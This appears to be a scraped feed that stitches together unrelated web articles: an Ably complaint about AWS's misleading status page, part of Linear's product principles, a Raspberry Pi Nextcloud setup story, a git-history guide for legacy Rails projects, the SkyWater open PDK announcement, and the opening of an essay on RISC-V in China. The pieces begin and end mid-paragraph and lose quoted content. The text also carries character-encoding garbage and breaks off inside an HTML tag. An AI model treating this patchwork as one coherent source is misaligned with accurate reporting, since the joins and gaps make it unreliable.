<p>This morning at 1:00am the reporting systems for <a href="https://ww.ably.io/platform" rel="noopener">our Ably realtime platform</a> notified us of a whole range of service failures for one of our customers in a dedicated realtime cluster in AWS’ Northern California datacenter (us-west-1).</p>
<p>We investigated and discovered network partitioning along with other severe network failures. We checked the AWS status dashboard for information — nothing, all green. 30 minutes later AWS finally posted a status update with this:</p>

<p>Fortunately that’s pretty simple — what we require is honesty and we expect AWS to err on the side of caution.</p>
<p>Here’s what we did at <a href="https://www.ably.io/" rel="noopener">Ably</a> for our customers to notify them about what happened when we detected the fault:</p>
<ul>
<li>We had monitoring systems to tell us immediately there was a fault, which in turn created an incident automatically in <a href="https://status.ably.io/" rel="noopener">our status site</a> within minutes of the problems in us-west-1.</li>
<li>We then manually <a href="https://status.ably.io/incidents/377" rel="noopener">updated the incident on our status site</a> with our commentary and emailed everyone signed up for status updates with the issue and what we were doing about it (which was to route traffic away from the faulty datacenter).</li>
<li>We took an honest approach and weren’t worried to show a bit of orange on our status site. Because if something is not operating as expected, then we are pretty sure that is not classified as “operating normally” and at best should be classified as “performance issues”. See our status dashboard below:</li>

<h3 id="amazon-aws-you-can-and-should-do-better">Amazon AWS — you can and “should” do better</h3>
<p>Our plea to Amazon AWS is please don’t fall into this post-truth trap and aim to have false green in your status dashboard. Looking at your AWS status dashboard today, in spite of the fact that an entire datacenter was unusable for a few hours this morning, is completely green. See the screenshots: (<a href="https://dl.dropboxusercontent.com/u/1575409/Ably/blog/status-aws-amazon-today-1.png" rel="noopener">page 1</a>), (<a href="https://dl.dropboxusercontent.com/u/1575409/Ably/blog/status-aws-amazon-today-2.png" rel="noopener">page 2</a>) — there is so much green on the status page that we were unable to fit the screenshot in one image (max height of 30,000 pixel). Amazon, your AWS status page today has 38,000 vertical pixels of green!</p>
<p>We rely on AWS infrastructure to deliver our realtime data delivery platform. Amazon needs to take their downtime and issues more seriously, be more upfront about what’s going on, and not wait half an hour to report that a datacenter being offline is “operating normally”. It’s not like they don’t have resources that outstrip any other infrastructure provider, <a href="https://www.google.co.uk/search?%7Bgoogle:acceptedSuggestion%7Doq=amazon+hires+100%2C000+in+a+month&amp;sourceid=chrome&amp;ie=UTF-8&amp;q=amazon+hires+100%2C000+in+a+month&amp;gws_rd=ssl" rel="noopener">they’re hiring 100k employees in the next 18 months</a>.</p>
<p>Amazon AWS, we expect more of you. Please be honest.</p>

Quality of software is driven by both the talent of its creators and how they feel while theyâ€™re crafting it. Teams that have the time and energy to be focused on the work itself can build magical, high quality software. Our tools and practices need to do their best to nurture this, not take it away.</p><p>To bring back the right focus, these are the foundational ideas Linear is built on.</p></header><section><h2>Principles</h2><h3>Build for the creators</h3><p>Software project management tools should build with the end users â€“ the creators â€“ in mind. Keeping individuals productive is more important than generating perfect reports.</p><h3>Opinionated software</h3><p>Productivity software should be opinionated. It's the only way the product can truly do the heavy lifting for you. Flexible software lets everyone invent their own workflows, which eventually creates chaos as teams scale.</p><h3>Create momentum â€“ don't sprint</h3><p>We should find a cadence and routine of working. In cycles, we decide priorities and assign responsibilities. Our goal is to maintain a healthy momentum with our teams, not rush towards the end.</p><h3>Meaningful direction</h3><p>Our daily work might be filled with tasks but we should understand and remind our teams of the purpose and long term goals of our work. Roadmaps, projects and milestones are all important to keep in mind as we plan our weekly schedules.</p><h3>Aim for clarity</h3><p>Donâ€™t invent terms if possible, as these can confuse and have different meanings in different teams. Projects should be called projects.</p><h3>Say no to busy work</h3><p>Our tools should not make us the designers and maintainers of them. We should throw away or automate the busy work so you can focus on the more important work.</p><h3>Simple first, then powerful</h3><p>Teams at different sizes have different needs. Tools should be simple to get started with and grow more powerful over time.</p><h3>Decide and move on</h3><p>There isn't always a best answer. The important thing is to make a decision, and move on.</p></section><section><h2>Practices</h2><h3>Set monthly, quarterly or/and annual roadmaps</h3><p>Ambitious goals are the only way to make a significant impact. Companies should focus on them when they define their high level direction. Reserve some space on your roadmaps for unexpected and reactive work that always comes up and allow your roadmap to change if needed.</p><h3>Connect daily work to larger goals with projects</h3><p>All projects and work should directly correlate to these goals. Review projects and their target dates during roadmap meetings and pull from projects as you plan cycles.</p><h3>Work in <i>n-week</i> cycles</h3><p>Cycles create healthy routine and focus teams on what needs to happen next. 2-week cycles are the most common in software building. They're short enough to not lose sight of other priorities but long enough to build significant features. Cycles should feel reasonable. Don't overload cycles with tasks and let unfinished items move to the next cycle automatically.</p><h3>Keep a manageable backlog</h3><p>You don't need to save every feature request or piece of feedback. Important ones will resurface and low priority ones will never get fixed. A more focused backlog makes it easier and faster to plan cycles, and ensures the work will actually get done.</p><h3>Mix feature and quality work</h3><p>All software has bugs, more than we can ever fix. Include bugs and other fixes as part of your cycles. Invest in tooling as it is a force multiplier if done right.</p><h3>Specify project and issue owners</h3><p>Each project should have a named owner responsible to own delivery and write the project brief. The same goes for issues. Others should collaborate but responsibility should lie with a single person.</p><h3>Write project specs</h3><p>Aim for brevity. Short specs are more likely to be read. The purpose of a spec is to briefly communicate the "why", "what" and "how" of the project to the rest of the team. Ideally these short documents force teams to scope out work so priorities are clear and teams avoid building the wrong thing.</p><h3>Understand your users</h3><p>The more popular your product, the more feedback you'll get. Overflowing inboxes are a good sign unless they're bug reports. Donâ€™t worry too much about organizing all the feedback. Collect it and use it as a research library when developing new features. Try to spot trends. Use feedback, even complaints, as an opportunity to get to know your users and ask them to explain why they want a specific feature so you find out their needs. Solve the problem â€“ donâ€™t just build the feature.</p><h3>Scope issues to be as small as possible</h3><p>It's hard to see visible progress when working on large tasks, which can be demotivating. Break down work into smaller parts and create an issue for each one when possible. Ideally you can complete several concrete tasks each week. It feels great to mark issues as done.</p><h3>Measure progress with actual work</h3><p>The clearest way to see whether something is complete or not is to show the diff in the code or design file. When the tasks are scoped small, your changes will be small and easier to review, too. Avoid massive pull requests or large design changes.</p><h3>Run cross-functional teams</h3><p>Designers and engineers should work together on projects, creating a natural push and pull. Designers bring their skills to explore ideas and push your team's thinking. Engineers can challenge thinking around implementation and will bring the winning ideas to reality. The best creators often have talent for both. Directly loop in other teams when building features they'll use or ask customers they interact with to use.</p><h3>Write a changelog</h3><p>Itâ€™s important to look back and celebrate what you achieved as a team. Consistent changelogs also communicate to the user new features, the value they get from your product, and your commitment to improving it. It's also an easy way to connect your team's individual work to the collective value they create.<!-- --> <a href="https://medium.com/linear-app/startups-write-changelogs-c6a1d2ff4820">Read more</a> on how we write ours.</p></section></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <h3 id="why-am-i-doing-this-to-myself">Why am I doing this to myself?</h3>
<p>I really like taking notes. Notes are an extension of my stupid brain, which can’t remember a <em>damn</em> thing on its own. All these notes were being stored on Google’s servers, which <a href="https://en.wikipedia.org/wiki/PRISM_%28surveillance_program%29" target="_blank" rel="noreferrer noopener">didn’t</a> <a href="https://www.gnu.org/proprietary/malware-google.en.html" target="_blank" rel="noreferrer noopener">seem like</a> <a href="https://www.washingtonpost.com/technology/2019/06/21/google-chrome-has-become-surveillance-software-its-time-switch/" target="_blank" rel="noreferrer noopener">the best</a> <a href="https://www.eff.org/deeplinks/2020/03/google-says-it-doesnt-sell-your-data-heres-how-company-shares-monetizes-and" target="_blank" rel="noreferrer noopener">idea</a>. And it wasn’t just notes. Pictures, videos, miscellaneous files, I was giving it all to Google for free.</p>
<p>Since my notes contain <em>my bad ideas, and they are <strong>my</strong> bad ideas alone</em>, I wanted to take back control of my data. After researching ways to do such a thing (through the Google search engine of course), my best option seemed to be a <a href="https://nextcloud.com/" target="_blank" rel="noreferrer noopener">Nextcloud server</a>.</p>
<p>Nextcloud has all the niceties of a Google Drive or Dropbox, but you host it yourself on your own hardware, and no one’s allowed to snoop. This sounded great! This’ll be so easy! I’ll get this running in just a couple minutes!</p>
<p>Maybe you guessed it from the length of this article, but… this was not the case. Building and setting up this server was a nightmare hellhole, and I’m here today to share my hell with you, the reader, for free!</p>
<p>This isn’t so much a guide or tutorial - more just me explaining (and venting about) the massive effort it took to set this damn thing up. I hope somebody someday learns something from my suffering, or is maybe just entertained.</p>
<h3 id="the-hardware">The hardware</h3>
<p>I had been interested in doing <em>something, anything at all</em>, with a <a href="https://www.raspberrypi.org/" target="_blank" rel="noreferrer noopener">Raspberry Pi</a> for a while, so this was my excuse. Beyond that, I just followed <a href="https://magpi.raspberrypi.org/articles/build-a-raspberry-pi-nas" target="_blank" rel="noreferrer noopener">this great article from a Pi magazine</a> for my hardware choices. If you’re wondering what hardware I used, look there. I copied it exactly. Plus, c’mon, look how cute everything looks stacked up like that! A literal “stack”! Ha!</p>
<p><img src="https://acolannino.io/blog/how-i-struggled-to-build-a-nextcloud-server-and-won/nextbox.png" alt="nextbox"></p>
<p>One part the guide doesn’t explain very well was the “USB powered hub” - both why you need one, and what that actually is. Is it a hub powered by USB? A USB powered by a “hub”? What is a “hub”? Maybe it seems obvious to you, and maybe I was just sleep deprived at the time, but I was having trouble wrapping my smooth brain around this concept.</p>
<p>Turns out, the USB hub is simply needed to provide power to the two hard drives, rather than the power going to the Pi <em>and</em> the drives. I have no idea if this was really necessary, but it makes me feel 10% more confident my drives won’t crap out at any moment, and that helps me go to sleep at night.</p>
<h3 id="raid-1-or-whatever-that-means">RAID 1, or whatever that means</h3>
<p>Here I was, all ready to go in fulfilling my long-held dream of running my own little server. Then my stupid coworker comes in, and asks “hey, what if your drive fails? what will you do then?” and ruins all of my fun.</p>
<p>He tells me I should do “RAID”, which is apparently all the rage. RAID stands for “Redundant, Awesome… I dunno”, and was invented on a whim by <a href="https://en.wikipedia.org/wiki/RAID#History" target="_blank" rel="noreferrer noopener">some random nerds in the 80’s</a>. To attempt to give an actual explanation: Using a RAID 1 setup means you get data redundancy, as it will constantly mirror the drives. If one drive craps out, the other drive will still have all the same data, so you just replace the broken one and go about your day as normal. The downside of RAID 1 is you’re getting half the storage capacity that you paid for, but I figured 1 terabyte was large enough to store plenty of memes.</p>
<p>Setting up the RAID array was by far the most pain-free part of the process. Actually, it was the <em>only</em> pain-free part, the rest was pure suffering. I recommend doing this for fun if you’re bored on a Friday evening. It’s cathartic, and the only part of this whole thing that <a href="https://www.youtube.com/watch?v=nVqcxarP9J4" target="_blank" rel="noreferrer noopener">just worked</a>.</p>
<p>All I had to do was run some cute little commands from the guide, and I was golden. I didn’t fully understand the intricacies of everything I was doing, and the command-line interfaces for some of these programs were absolutely wild (press ‘n’ for a new partition, and ‘p’ for a “primary partition”? Really <code>fdisk</code>? Does this make you happy?), but other than that, it was all smooth sailing.</p>
<p>I should note - no one on the internet really cared to explain how a RAID setup should work with Nextcloud. Eventually I figured this out - the RAID array is seen by the OS as one device, so just politely ask Nextcloud to use that instead of the SD card. I ended up having to <a href="https://docs.nextcloud.com/server/latest/admin_manual/issues/general_troubleshooting.html#troubleshooting-data-directory" target="_blank" rel="noreferrer noopener">create a symlink from Nextcloud’s data directory to a directory on my RAID device</a>, but this wasn’t the worst thing I had to suffer through.</p>
<h3 id="big-pixel-energy-destroys-my-wifi">Big Pixel Energy destroys my WiFi</h3>
<p>So here I am, all proud and happy of my brand new Raspberry Pi running a fresh <del>Raspbian</del> Raspberry Pi OS. As I was setting up the RAID array, downloading lots of cute <a href="https://en.wikipedia.org/wiki/Unix_philosophy" target="_blank" rel="noreferrer noopener">UNIX-style utilities</a>, the WiFi starts to cut in-and-out. This has been a problem on my other main machines ever since I switched them to Linux, so I figured it was the <em>mysterious Intel WiFi+bluetooth death bug</em> plaguing me on yet another machine.</p>
<p>I did some more digging, and found what I believe to be the truth (or, as close as <em>I’ll</em> ever get to the truth). There appears to be a <a href="https://www.raspberrypi.org/forums/viewtopic.php?t=247982" target="_blank" rel="noreferrer noopener">widely reported problem with the Pi 4</a> where the signals coming out from the HDMI (which are shaped like squares?) are the same frequency(?) as the WiFi. So, if your display resolution is pumped up high enough, and that HDMI is cranking out lots of square signals, <a href="https://www.raspberrypi.org/forums/viewtopic.php?p=1514642&amp;sid=b811be4b798c7ab50d7626c691b5cc26#p1514642" target="_blank" rel="noreferrer noopener">the WiFi gets totally borked</a>. Neat.</p>
<p>This is clearly absurd, and I hate it. Hardware is bad, and everyone saying “programmers gotta learn hardware too!!!” should get off my lawn. At first I started following the internet’s advice to simply “lower your screen resolution so the WiFi goes fast”, but this became tiring on the eyes (especially with the added problem of <a href="https://www.raspberrypi.org/forums/viewtopic.php?t=250534" target="_blank" rel="noreferrer noopener">not being able to use redshift on the Pi</a>).</p>
<p>Even though I was reluctant to at first, eventually I started controlling my Pi via an SSH terminal from another machine to avoid this problem entirely. Boy oh boy, was this a joyful discovery. Not only was I freed from whatever stupid resolution the WiFi demanded, but I could also use my beloved blue-light filter to prevent my retinas from burning up. Sure, I had no GUI, but learning to do everything through the terminal came easily enough, and once I got there, I felt like some kind of computer wiz-kid.</p>
<h3 id="the-installation">The installation</h3>
<p>After the RAID was set up and I got SSH going, it was time to install Nextcloud. This proved to be shockingly difficult. There can’t just be a little <code>sudo apt install nextcloud</code> action, no no no no no. You need to install each little bit yourself, by hand, and glue every piece together (<code>nextcloud</code> isn’t even in the apt repository, of course you have to download / unpack something called a “tarball” yourself).</p>
<h4 id="attempt-1-snap">Attempt 1: Snap!</h4>
<p><a href="https://snapcraft.io/" target="_blank" rel="noreferrer noopener">Snap</a> is Canonical’s (maker of Ubuntu) locked-down little sandbox for Linux apps. The word “container” is thrown around when describing it, and I have no idea if that’s correct, but I sure as heck wouldn’t recommend the <a href="https://snapcraft.io/nextcloud" target="_blank" rel="noreferrer noopener">official Nextcloud snap</a>.</p>
<p>The major selling point of snap is that it bundles together an application’s dependencies, so it will <em>just work</em> on any Linux distribution. This sounds great! Sign me up! I’m lazy and hate installing my own dependencies! Who the heck wants to do that? Shell scripts, that’s who.</p>
<p>Problem is, this doesn’t <em>really</em> work on every distro, and in fact, it doesn’t work on the latest Raspberry Pi OS. Do I know why? No. The Nextcloud snap <a href="https://en.wikipedia.org/wiki/Fail-silent_system" target="_blank" rel="noreferrer noopener">failed silently</a> before starting up, and it was too shy to tell me why. Cool.</p>
<h4 id="attempt-2-some-shell-scripts-i-found">Attempt 2: Some shell scripts I found</h4>
<p>At this stage, I was still committed to being a lazy jerk. There’s no way in heck I would manually install <a href="https://docs.nextcloud.com/server/latest/admin_manual/installation/source_installation.html#prerequisites-for-manual-installation" target="_blank" rel="noreferrer noopener">30-something php modules</a> by hand. So, I found a <a href="https://ownyourbits.com/nextcloudpi/" target="_blank" rel="noreferrer noopener">flashy looking site that claimed to have the scripts for me</a>. It didn’t work. The script took multiple runs to actually complete itself, and after the 5th or so attempt, it seemed happy. I went to the web GUI, told it to “initialize”, and it kinda hung out there for a while. I went to take a walk, and when I came back and it was still pretending to initialize.</p>
<p>I found another <a href="https://github.com/nextcloud/vm" target="_blank" rel="noreferrer noopener">official-sounding shell script</a>, in a last-ditch attempt at being lazy. At least this script had the courage to fail immediately, as it’s <a href="https://github.com/nextcloud/vm/blob/master/nextcloud_install_production.sh/#L83" target="_blank" rel="noreferrer noopener">hardcoded to only work specifically on Ubuntu 20.04</a>. Would have been real nice if it had told me that up-front, but hey, I’m not the one going through the trouble of writing all these (failing) shell scripts.</p>
<h4 id="attempt-3-the-hard-way">Attempt 3: The hard way</h4>
<p>Being lazy clearly wasn’t going so well. By now several days had passed, and all I had to show for myself was a whole terabyte of nothing. Worse yet, the shell scripts I ran had spread their little tentacles all over my pure OS install, so I knew I’d have trouble in the future if I left all that cruft in-place. I decided to re-image my OS, and that I would repeat the RAID setup once I got Nextcloud going.</p>
<p>As previously mentioned, the <a href="https://docs.nextcloud.com/server/latest/admin_manual/installation/source_installation.html" target="_blank" rel="noreferrer noopener">recommended installation</a> wants you to install and hook each bit up together yourself. This approach made some sense as I learned (sort of, vaguely) more about how Nextcloud works - It’s running on a webserver directly on your machine, handling all the networking and whatnot, with a full-on SQL database and lots of PHP magic happening too. So, it’s understandable that Nextcloud has to spread it’s mischievous claws in each and every crevice of your OS.</p>
<p>I followed the <a href="https://docs.nextcloud.com/server/latest/admin_manual/index.html" target="_blank" rel="noreferrer noopener">Nextcloud documentation</a>, which sure does exist. In their defense, all of their software is <a href="https://en.wikipedia.org/wiki/Free_and_open-source_software" target="_blank" rel="noreferrer noopener">free and open</a>, including the docs, so I could have submitted any number of changes, and yet here I am selfishly writing this blog. The worst part of this process was the aforementioned php modules, which had to be installed one-by-one, and had mismatched names compared to the Debian repository. I had these all installed after about an hour, and I remember listening to a podcast in the background while suffering through it.</p>
<p>After <code>apt install</code>ing every module (seriously, why doesn’t php have it’s own package manager?!), then gliding through the initialization of Nextcloud with <code>occ</code>, my server was working.

<h4>To keep track of how a project has been changing through time is key to provide a big picture of what things have been changing and why. After all, the business logic or the domain required those changes to be recorded. Read this to know why it is important to keep an eye on a project’s history.</h4>

<h2>Become a Git Historian</h2>
<p>This is chapter 2 of a series of blog posts about some pieces of advice, tools, and tips you can consider when you arrive at a Rails project considered as Legacy.</p>
<p>In the <a href="http://blog.magmalabs.io/2020/04/24/approaching-rails-legacy-systems-chapter-1-project-anatomy.html">previous chapter</a>, we reviewed our project’s anatomy.</p>
<p>In this chapter, we are using <a href="https://git-scm.com/">Git</a> and other tools related to it to find out more about our Rails Legacy System. But this time, it’s our project’s history turn.</p>
<p>First, I want us to understand ‘<strong>history</strong>‘ as:</p>
<blockquote><p>
  “The whole series of past events connected with someone or something”.
</p></blockquote>
<p>When speaking about history in a Rails project, it’s really important to check <em>how</em> our project has changed through time to get an idea of why things have been modified. Some of those adjustments were maybe done based on business logic, or maybe the domain required those changes.</p>
<p>Maybe, other changes happened because someone followed a particular path —which is a normal thing if you consider that every project is different and that there are infinite factors that can affect it in a positive or in a negative way.</p>

<p>In Software Development, a legacy system is outdated computing software that is still in use. That system still meets the needs it was originally designed for but doesn’t allow growth. What a legacy system does now for the project is all it will ever do. A legacy system’s older technology won’t allow it to interact with newer systems.</p>
<h2>Git extras</h2>
<p>To get a general summary of things about the project, like repo age, the number of commits, and who the people involved are we could use <a href="https://github.com/tj/git-extras"><code>git-extras</code></a>.</p>
<pre><code>$ brew install git-extras
</code></pre>
<pre><code>$ git summary

 project  : big_rails_jump

</code></pre>
<p>Here is another interesting feature from git-extras, let’s try <code>git effort</code>:</p>
<pre><code>$ git effort --above 15 {src,lib}/*
</code></pre>
<blockquote><p>Displays “effort” statistics. Currently, it shows just the number of commits per file, highlighting the parts with the most activity. The “active days” column is the total number of days when contributed modifications to this file were made.</p></blockquote>

<p><a href="https://github.com/tj/git-extras"><code>git-extras</code></a> has many interesting features that you can explore and use to get a better understanding of your project.</p>
<h3>Git log</h3>
<p>Ok, now let’s understand how <em>change</em> on single objects works with <code>git log</code>.</p>
<pre><code>$ git log --patch --stat Gemfile

<p>As you can see, it will show why a specific update was made. Or, maybe it will just trigger more questions. But, at least you will be closer to your main goal, which is “understand what was the purpose of those changes”.</p>
<h3>Git History</h3>
<p>Also, if you prefer the fancy way and see the timeline of a particular file, you can try <code>git-history</code>.</p>
<p>Now, let’s use <a href="https://github.com/pomber/git-history">git-history</a>, which is like a visual time machine where you can visually review any change on a specific file and understand its timeline.</p>
<p><a href="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg"><img data-attachment-id="5429" data-permalink="http://blog.magmalabs.io/2020/04/24/approaching-rails-legacy-systems-chapter-1-project-anatomy.html/git_history_-_admin_html_slim" data-orig-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?fit=2084%2C1350" data-orig-size="2084,1350" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Git_History_-_admin_html_slim" data-image-description="" data-medium-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?fit=300%2C194" data-large-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?fit=1024%2C663" src="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=1027%2C665" alt="" width="1027" height="665" srcset="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=300%2C194 300w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=200%2C130 200w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=768%2C498 768w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=1024%2C663 1024w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=1200%2C777 1200w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=860%2C557 860w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=680%2C440 680w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=400%2C259 400w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=50%2C32 50w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?w=2000 2000w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></a></p>
<p>Check this <a href="https://githistory.xyz/webdevtalks/www/blob/master/Gemfile">example</a> out.</p>
<h3>Look for Documentation (we’re using Git as well)</h3>
<p>As we look for documentation keep in mind and ask yourself the following:</p>
<ul>
<li>Is there any documentation at all?</li>
<li>Is there good commentary on the code?</li>
<li>Do the names of things make sense?</li>
<li>Are the System Use Cases documented?</li>
<li>Is there someone in the team that understands the system?</li>
</ul>
<p>We can use <code>git whatchange doc</code> to see logs and differences in our documentation, check the example above:</p>
<pre><code>$ git whatchanged doc
commit e43e0fecfb5914ec0e72eadff73e90c0e14c7026
Author: Daniel Contreras &lt;daniel.country.club@magmalabs.io&gt;
Date:   Thu Jan 28 19:32:35 2016 -0500

    Render diagram inline. Use AsciiDoc for the table of contents.

:100644 100644 13fa6c9d4 ff7935d08 R055 doc/client-system/README.md     doc/client-system/README.adoc
</code></pre>
<p>It seems that we have a doc folder. 🎉🎉🎉 It also seems like the last time a document was modified was in 2016, so it’s time to start documenting your new progress. That would help you in the future, and any other developer that joins the team.</p>
<h3>Extra: The README</h3>
<p>There is a README?  Well, yes. But it is so poor…</p>
<p><a href="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg"><img data-attachment-id="5432" data-permalink="http://blog.magmalabs.io/2020/04/24/approaching-rails-legacy-systems-chapter-1-project-anatomy.html/readme_template" data-orig-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?fit=2032%2C490" data-orig-size="2032,490" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="README_Template" data-image-description="" data-medium-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?fit=300%2C72" data-large-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?fit=1024%2C247" src="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=1424%2C343" alt="" width="1424" height="343" srcset="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=300%2C72 300w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=200%2C48 200w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=768%2C185 768w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=1024%2C247 1024w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=1200%2C289 1200w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=860%2C207 860w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=680%2C164 680w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=400%2C96 400w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=50%2C12 50w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?w=2000 2000w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></a></p>
<p>Hey, but don’t worry, there are many templates you can use; like this <a href="https://github.com/dbader/readme-template" rel="noopener" target="_blank">example</a>.</p>
<h2>Wrap up</h2>
<p>Here are more things to keep in mind:</p>
<ul>
<li>Document everything you learn.</li>
<li>Keep documentation close to the code, simple is better.</li>
<li>You must understand the design/architecture.</li>
<li>Once you understand something, refine its documentation.</li>
</ul>
<p>I hope you find this blogpost compelling. In the following chapter, we are going to cover some nice toolings for static analysis of your code.</p>

    <p>Did you ever dream about creating your own chip?
I mean, a physical chip.
One which you can hold in your hand, and which does exactly what you’ve designed it to do?</p>

<p>Until today, there were two major road blocks: you had to get access to a process design kit (PDK) from a chip manufacturing house (a foundry), and you had to have enough money to actually pay for the manufacturing.
These times are over.
Today.</p>

<p>Today, in a FOSSi Dial-Up talk, Tim Ansell of Google announced <a href="https://github.com/google/skywater-pdk">SkyWater PDK</a>, the first manufacturable, open source <a href="https://en.wikipedia.org/wiki/Process_design_kit">process design kit</a>.
What differentiates this PDK from previous attempts is the fact that it is manufacturable: with this PDK, you can actually produce chips with the <a href="https://www.skywatertechnology.com/">SkyWater foundry</a> in the 130nm node.</p>

<p>That leaves you as chip designer only with one road block: money.
Manufacturing chips is expensive – even for more than a decade old nodes like the 130nm node, you need to spend at least a couple thousand dollars.</p>

<p>You know what?
Don’t worry – Google and efabless have got you covered!
They are providing <strong>completely free of cost</strong> chip manufacturing runs: one in November this year, and multiple more in 2021.
All open source chip designs qualify, no further strings attached!</p>

<p>Learn more about all of that by re-watching <a href="https://www.youtube.com/watch?v=EczW2IWdnOM">Tim’s Dial-Up talk</a> or click through the <a href="https://docs.google.com/presentation/d/e/2PACX-1vRtwZPc8ykkkgtUkHkoJZrP9jKOo3FYdKqbg-So0ic6_kx7ha1vHnxrWmuxWkTc9GfC8xl0TfEpMLwK/pub?start=false&amp;loop=false&amp;delayms=3000">slides</a>.</p>

<p>This is certainly a dream come true for us at the FOSSi Foundation.
We helped the Free and Open Source Silicon community, our community, grow and tackle huge challenges over the years.
An open, manufacturable PDK was the main blocker in a fully open flow between RTL and a physical chip, and we’re extremely excited to see that blocker removed.</p>

<p>As always, removing one roadblock only highlights more challenges:
RAM, ROM and flash compilers, analog blocks, optimizations to various tools, and much, much more.
Now is the perfect time to get involved in the Free and Open Source Silicon ecosystem – or learn more about the accomplishments and challenges ahead of us.
A good starting point are the next Dial-Up talks.</p>

            <section>
                <div>
                    <p>【想看中文的<a href="https://interconnected.blog/riscv-china-nightingales/#chinese-version-below">读者请点击这里</a>或滚动到本页下方】</p><p>Last weekend, I read <a href="https://www.huxiu.com/article/360061.html">a long, epic piece of techlore</a> that chronicled the fierce and bitter rivalry between TSMC and Samsung in their fight to become the world’s number 1 chip foundry, which stretched back three decades and continues today.</p><p>Among the many dramatic details was the “Nightingale program” that TSMC started in the mid-2010s to jumpstart its R&amp;D, because it was falling behind Samsung and losing Apple’s A9 chip orders to the Korean conglomerate. TSMC conceived of a three-shift, 24-hour non-stop R&amp;D operation, taking a page out of their fellow Taiwanese manufacturing behemoth Foxconn’s assembly operation. The “Nightingales” were engineers and researchers, who were willing to work the “graveyard shift” for a 30% increase in base salary and 50% increase in dividend payout. Due to this program, <strong>the total working hours clocked in Taiwan in 2014 was 2135</strong>, apparently the most of any economy in the world that year.</p><p>TSMC, and arguably Taiwan’s entire economy, was confronting an existential struggle at that time. SMIC (the largest chip foundry in China), and arguably China’s technological and economic future, is confronting a similarly existential struggle on a larger scale.</p><p>There are many interconnected elements that, when put together, could determine how China will come out on the other end of this struggle -- <strong>RISC-V, foundry technology, the “New Infrastructure” stimulus program, open source, and a few key TSMC personnels</strong>, who are now at the helm of China’s semiconductor industry.</p><p>Let’s take a look at each of them, sequentially and interconnectedly.</p><h2 id="risc-v-strengths-and-weaknesses">RISC-V: Strengths and Weaknesses</h2><p>The conversation around China’s journey towards technological self-reliance often involves <strong>RISC-V</strong> -- an open standard Instruction Set Architecture (ISA) for hardware that’s under open source licenses, thus any one can run, change, copy, and distribute it, in accordance with<a href="https://www.gnu.org/philosophy/free-sw.en.html"> the four freedoms</a> of open source.</p><figure><img 